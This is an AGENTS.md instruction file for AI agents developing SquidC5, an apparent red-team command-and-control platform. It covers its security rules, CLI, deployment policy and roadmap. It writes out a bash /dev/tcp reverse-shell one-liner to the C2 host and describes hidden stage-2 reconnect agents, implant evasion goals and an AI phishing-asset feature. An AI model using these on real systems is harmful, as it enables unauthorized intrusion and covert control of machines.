# AGENTS.md — Instructions for AI Agents Working on SquidC5

## Classification & Mission

**SquidC5 is a military-grade, security-first, AI-native Command & Control platform under active development** for **authorized** red team, penetration testing, and defensive security operations only.

Treat every change as if the system will be deployed in high-threat environments:

- Prefer **secure defaults** over convenience
- Minimize attack surface and fingerprinting
- Never weaken auth, AI sandboxing, audit, or allow-lists without explicit human design review
- Assume hostile network exposure (internet-facing listeners, scanners, credential stuffing)

Unauthorized access assistance is out of scope. Do not help with illegal use.

## Project Stack

Primary language: Python 3.11+ · FastAPI · SQLite · Docker-first  
Operator CLI: `sc5` (also `squidc5-cli`)  
Ops UI: `/ops` (admin UI loaded only after server-side admin token check)

## Non-Negotiable Security Rules

1. **Secure by default**: New installs must ship hardened (no public docs/OpenAPI, no wildcard CORS, MCP off until enabled, exec probe on, false-shell filter on).
2. **External AI restriction**: MCP tools must remain allow-listed per token. No open-ended autonomous agent loops for external models.
3. **Admin AI shielding**: Never feed raw session output into LLM prompts without `sanitize_untrusted()`. Keep capabilities allow-listed. Prefer offline/deterministic fallbacks when no LLM is configured.
4. **Determinism preference**: Templates, fixed prompts, single-step tools over free-form agentic planning.
5. **Audit everything**: Operator, MCP, Admin AI, feature toggles, and admin UI loads go through the policy engine / audit trail.
6. **No secrets in git**: Tokens, API keys, `data/`, `admin_token.txt`, `~/.config/squidc5/config.json` stay out of the repository.
7. **Port flexibility**: Never hard-require ports 80 or 443 — operators *may* use them.
8. **Admin UI isolation**: Admin-only HTML/JS must be served only after server validates an **admin** token (`/api/v1/ops/admin.js`). Non-admin clients must never receive admin control code.
9. **Public docs locked off**: `/docs`, `/redoc`, `/openapi.json` stay disabled. Feature flag `public_docs` is hard-forced `false`.
10. **Authorized use only**.

## Hardened Defaults (do not casually reverse)

| Control | Default |
|---------|---------|
| Public Swagger / OpenAPI | **OFF** (hard-locked) |
| CORS | **empty** (no `*`) |
| MCP external tools | **OFF** until settings/feature enable |
| Shell exec probe | **ON** |
| False-shell filter | **ON** |
| Auto stage-2 stabilize | **ON** |
| Health details | **minimal** (`{"status":"ok"}`) |
| Security headers | **ON** (nosniff, DENY frame, CSP, no-store) |
| Admin ops UI | **server-gated** by admin scope |

When adding features: **deny by default**, enable via admin feature flags or env after review.

## Development pipeline (mandatory)

Source of truth also: Windows SquidSec workspace  
`/mnt/c/Users/ynot_/OneDrive/Desktop/Company Data/SquidSec/AGENTS.md` + `knowledge-base/MEMORY.md`  
→ **Development cycles (git repos)**.

### Git cycle (every change)

1. **Update main/master** — pull latest  
2. **Feature branch** — name for the change  
3. **Unit tests first** — describe expected behavior  
4. **Implement** code  
5. **Red-green-refactor** — all tests pass; clean up  
6. **Push branch** (never direct to main)  
7. **Open PR**  
8. **Wait for CI** — do not merge red  
9. **Merge** when green  
10. **Next change** — back to step 1  

### Prod after merge

```text
merge main → CI builds Linux/Windows binaries → GitHub Release published
  → deploy Linux squidc5 binary ONLY (from Release assets or workflow Artifacts)
```

Releases: `https://github.com/DotNetRussell/SquidC5/releases` (created by CI job `github-release` on main/master only).

- **Never** commit/push straight to `main`/`master`
- **Never** rsync WIP source or `docker compose up --build` to prod
- **Never** deploy a feature-branch-only binary
- Docker is for **local/lab** only once binary prod path is active
- Full policy: see **Production deploy policy** under Deployment Knowledge

## Roadmap 2026–2027 (next work — prioritized)

Full detail: `docs/roadmap-2026-2027.md`. Agents plan work against this list; stay OPSEC-first, agents-on-rails.

| # | Focus | Notes |
|---|--------|--------|
| **1** | **Malleable / adaptive C2 profiles** | **TOP PRIORITY** — HTTP/S, DNS, WS; jitter; decoy; runtime switch |
| 2 | Advanced implant / beacon framework | Stagers, injection, memory-only, BOF-like; Win/Linux/macOS |
| 3 | Evasion & anti-analysis | Sandbox/VM/debugger resistance; fronting/CDN; QUIC/WebTransport candidates |
| 4 | Multi-operator collaboration | Teams, chat, handoff, spectator; per-operator audit |
| 5 | Deeper AI (railed) | Policy-limited chaining; local LLM; beacon anomaly suggestions |
| 6 | Plugin / extension system | Signed plugins; allow-list; ops discovery |
| 7 | Observability / forensics dashboard | Timeline, ATT&CK map, reports, heatmap |
| 8 | Deploy & OpSec hardening | Nix/microVM/K8s; redirectors; cert/domain rotation |
| 9 | Testing & validation suite | Lab victims; evasion benchmarks; playbook scenarios |
| 10 | Community & docs | Runbook, threat model, disclosure, OPSEC changelogs |

**When implementing any roadmap item:** small PRs, tests required, secure defaults, no weakening of MCP/Admin AI/public_docs locks, prod only via main CI binary.

## Architecture Map

```
src/squidc5/
  main.py           # FastAPI app + lifespan + security headers (no public docs)
  config.py         # Settings (SQUIDC5_* env) — secure defaults
  features.py       # Runtime feature flags (admin-toggleable; public_docs locked)
  cli.py            # Operator CLI (sc5)
  db/store.py       # SQLite schema + access
  auth/tokens.py    # Scoped tokens
  policy/engine.py  # Allow/deny, risk, HITL
  sessions/         # Beacon & shell sessions (orphan reap + verified shells)
  listeners/        # http/tcp/reverse_shell + stage-2 + exec probe
  shells/           # classify (false shells) + stabilize (stage-2)
  tasking/          # Structured tasks
  payloads/         # Deterministic templates
  mcp/server.py     # Restricted external AI tools
  ai/admin_ai.py    # Sandboxed internal AI (BYO LLM, e.g. xAI Grok)
  api/routes.py     # REST API + /ops/admin.js gate + /features
  metrics/          # Counters + SSE events
  audit/            # Audit facade
web/
  phone-dashboard.html   # Public ops shell (no admin code)
  ops-admin.js           # Admin-only module (served after admin auth)
```

## Operator CLI (`sc5`) — Agent Knowledge

Entry points (after `pip install -e .`):

- `sc5`
- `squidc5-cli`

Config file (local only, never commit):

- Path: `~/.config/squidc5/config.json`
- Keys: `url`, `token`
- Env overrides: `SQUIDC5_URL` / `SC5_URL`, `SQUIDC5_TOKEN` / `SC5_TOKEN`
- Global flags: `--url`, `--token`, `--timeout`

### Full command surface

```
sc5 login --url <base> --token <sc5_...>
sc5 config [--show-token]
sc5 health | whoami | metrics | audit [--limit N] | events | repl

sc5 sessions list [--status active|closed] [--all] [--shells] [--include-dead] [--ids]
sc5 sessions get <id>
sc5 sessions close <id>
sc5 sessions reap [--no-probe]

sc5 tasks list [--session <id>]
sc5 tasks get <id>
sc5 tasks create <session_id> "<command>" [--args-json '{}'] [--hitl]

sc5 listeners list
sc5 listeners create <name> <port> [--kind http|tcp|reverse_shell] [--host 0.0.0.0]
sc5 listeners start|stop|delete <id>

sc5 payloads templates
sc5 payloads generate <template> <host> <port> [--interval 5] [--raw]
# templates: http_beacon_python | http_beacon_bash | reverse_shell_bash | reverse_shell_python

sc5 shell <session_id> <command...> [--wait N] [--json]
sc5 shell all <command...>          # broadcast to verified shells only
sc5 shell --all <command...>
sc5 output <session_id>

sc5 tokens list
sc5 tokens create <name> --scopes "a,b,c" [--mcp-tools "t1,t2"]
sc5 tokens revoke <id>

sc5 ai <capability> [--data "..."] [--llm <id>]
# capabilities: payload_template | phishing_asset | doc_generate | shell_classify | recon_assist

sc5 llm list
sc5 llm add <name> <model> [--provider openai|xai] [--base-url URL] [--api-key KEY]

sc5 mcp tools
sc5 mcp call <name> [--args-json '{}']

sc5 policy get
sc5 policy set --json '...' | --file rules.json
```

### Sessions defaults

- `sc5 sessions list` → **active + live + verified reverse shells** (and active beacons when not `--shells`)
- Dead / echo-only shells are reaped (TCP gone or fail exec probe)
- Prefer `verified: true` before operator shell interaction

### Reverse-shell operator flow

1. `sc5 listeners create rev <port> --kind reverse_shell`
2. `sc5 listeners start <id>` — must show `running`
3. On authorized target: `bash -i >& /dev/tcp/<C2_HOST>/<port> 0>&1`
4. `sc5 sessions list --shells` → find `kind: reverse_shell` with `verified: true`
5. `sc5 shell <session_id> "whoami"` — prints remote output
6. Optional: `sc5 events` for `shell.connected` / `shell.output` / `shell.verified` / `session.rejected`

### Auto-stabilize + false-shell filter

On capture, the server:

1. **Classifies** inbound bytes (`shells/classify.py`) — drops TLS ClientHello, HTTP probes, binary noise (common on port 443). Rejected sessions are **deleted** (event: `session.rejected` / `shell.false_positive`).
2. **Probes OS** then injects stage-2:
   - **Linux** → background reconnecting Python line-executor (`SC5_STABLE_LINUX`, supports `SC5_PING`)
   - **Windows** → hidden PowerShell reconnect agent (`SC5_STABLE_WIN`)
3. Stage-2 agents reconnect to `SQUIDC5_PUBLIC_HOST:<listener_port>` and are **not** re-staged (banner skip).
4. **Exec probe** must pass or session is dropped (no more “live but mute” shells).
5. TCP keepalive enabled; idle read timeouts no longer fake liveness.

Config: `SQUIDC5_SHELL_AUTO_STABILIZE`, `SQUIDC5_PUBLIC_HOST`, `SQUIDC5_SHELL_STABILIZE_DELAY_SEC`, `SQUIDC5_SHELL_PROBE_WAIT_SEC`.

Beacon flow:

1. Generate HTTP beacon payload pointing at `http://HOST:8443/api/v1/implant/beacon`
2. Run payload on authorized target
3. `sc5 sessions list` → `kind: beacon`
4. `sc5 tasks create <session_id> "id"` then re-check `sc5 tasks get <task_id>`

## Dual AI Architecture

### External AI (MCP)

- Scoped tokens + per-token tool allow-list
- Deterministic single-tool preference; chain length limited by policy
- Feature flag / settings: MCP **off by default**

### Server-side Admin AI

- BYO LLM (OpenAI-compatible, including xAI Grok at `https://api.x.ai/v1`)
- Capabilities allow-list only
- `sanitize_untrusted` on untrusted input
- Offline fallback if no LLM configured
- Status: `GET /api/v1/ai/status` (+ `?debug=true`) — **never returns API keys**

## Deployment Knowledge (Docker)

### Critical: listener ports vs Docker networking

**Current compose uses `network_mode: host`** so reverse-shell/TCP listeners bind real host ports without republishing.

If someone switches back to bridge mode, every reverse-shell/TCP port must be published and opened in UFW.

### Privileged ports (<1024)

Container runs as non-root. Binding 443 needs:

```bash
sysctl -w net.ipv4.ip_unprivileged_port_start=0
echo "net.ipv4.ip_unprivileged_port_start=0" > /etc/sysctl.d/99-squidc5.conf
```

### Admin token bootstrap

On first start: written once to `$SQUIDC5_DATA_DIR/admin_token.txt` — **never commit**.

```bash
docker exec squidc5 cat /data/admin_token.txt
```

### Production deploy policy (MANDATORY for agents)

**Do not deploy source trees, Docker rebuilds-from-WIP, or local unmerged code to prod.**

Prod is updated **only** with the **standalone `squidc5` executable** produced by CI after a clean merge pipeline:

1. Feature work lands via **PR**
2. **All tests pass** on the PR (CI green)
3. PR is **merged to `main` / `master`**
4. CI **builds** Linux/Windows binaries (`sc5`, `squidc5`) on that merge
5. Agent downloads the **Linux `squidc5` artifact** from that successful main-branch run
6. Agent deploys **that binary only** to the droplet (replace process; keep `data/`)

```text
PR → tests green → merge main → CI binaries → deploy squidc5 binary to prod
```

**Forbidden on prod:**
- `rsync` of the working tree / unmerged branches
- `docker compose up --build` from local dirty checkout
- Deploying a binary built only on a feature branch (must be main CI artifact)
- Hot-patching prod with untested edits

**Allowed on prod:**
- Install/restart the main-built `squidc5` binary under e.g. `/opt/squidc5/bin/squidc5`
- Preserve `/opt/squidc5/data` (DB, admin token, LLMs)
- Env: `SQUIDC5_*` (public host, ports, etc.)

Example (after downloading main CI artifact):

```bash
# from operator machine — ARTIFACT is linux squidc5 from main CI
scp -i <key> squidc5 root@<droplet>:/opt/squidc5/bin/squidc5.new
ssh -i <key> root@<droplet> '
  set -e
  systemctl stop squidc5 || pkill -x squidc5 || true
  mv /opt/squidc5/bin/squidc5.new /opt/squidc5/bin/squidc5
  chmod +x /opt/squidc5/bin/squidc5
  systemctl start squidc5   # or: SQUIDC5_DATA_DIR=/opt/squidc5/data /opt/squidc5/bin/squidc5
'
```

Docker remains valid for **local/lab** use only, not the default prod path once binary deploy is active.

Legacy source rsync + compose (lab only — **not prod**):

```bash
rsync -az -e "ssh -i <key>" \
  --exclude '.venv' --exclude 'data' --exclude '.git' \
  ./ root@<droplet>:/opt/squidc5/
ssh -i <key> root@<droplet> \
  'cd /opt/squidc5 && docker compose up -d --build --force-recreate'
```

Also: `scripts/deploy_droplet.sh <ip>` (lab/Docker; not the prod binary path)

**Do not store live tokens, SSH private keys, or API keys in this file.**

## Auth Model (quick)

- Tokens: `sc5_<urlsafe>`
- Header: `Authorization: Bearer <token>` or `X-API-Token: <token>`
- Scopes: `admin`, `sessions:read|write`, `tasks:read|write`, `listeners:read|write`,  
  `payloads:generate`, `metrics:read`, `audit:read`, `shell:interact`, `ai:use`,  
  `mcp:connect`, `tokens:manage`, `llm:manage`, `policy:manage`, …
- External AI: `mcp:connect` + per-token `mcp_tools` allow-list
- Feature toggles: `GET/PUT /api/v1/features` (admin)

## Dev Commands

```bash
python -m venv .venv && source .venv/bin/activate
pip install -r requirements-dev.txt
pip install -e .
pytest -q
ruff check src tests
uvicorn squidc5.main:create_app --factory --host 0.0.0.0 --port 8443
sc5 login --url http://127.0.0.1:8443 --token "$(cat data/admin_token.txt)"
```

Docker:

```bash
docker compose up --build -d
docker exec squidc5 cat /data/admin_token.txt
```

## Required Agent / Project Memory Files

| File | Purpose |
|------|---------|
| `AGENTS.md` | **This file** — primary agent operating memory |
| `CLAUDE.md` | Pointer to AGENTS + docs |
| `docs/squidc5-vision.md` | Full product vision / security architecture |
| `docs/roadmap-2026-2027.md` | Prioritized next-gen roadmap (10 focus areas) |
| `docs/operator-runbook.md` | Operator procedures |
| `docs/deployment.md` | Binary prod deploy + lab Docker |
| `README.md` | Public-facing quickstart |
| `SECURITY.md` | Disclosure policy |
| `.gitignore` | Blocks secrets, data, local config |
| `.env.example` | Env template without secrets |

## When Changing Code

- Keep changes small and auditable
- **Preserve secure-by-default posture** — new endpoints require auth/scopes; no public API maps
- Add/adjust pytest coverage for auth, policy, MCP allow-lists, AI sanitization, CLI, feature flags
- Update `docs/squidc5-vision.md` if behavior/spec changes
- Update this `AGENTS.md` when CLI surface, deploy model, security boundaries, or defaults change
- Do not weaken MCP tool restrictions, Admin AI sandbox, admin UI gate, or unlock `public_docs`
- Never commit tokens, keys, or `data/` DB files
- **Prod deploy:** only the main-CI `squidc5` binary after PR merge (see Production deploy policy above)

## Testing Focus

- Token scope enforcement
- Admin UI 403 for non-admin tokens
- MCP tool allow-list denial paths
- Policy HITL / deny thresholds
- `sanitize_untrusted` injection filtering
- Feature flag denial paths
- Listener port bind (non-privileged ports; document privileged-port host sysctl)
- Implant beacon task poll/complete cycle
- Shell exec probe drops echo-only zombies
- CLI login + basic authenticated calls (no live secrets in tests)
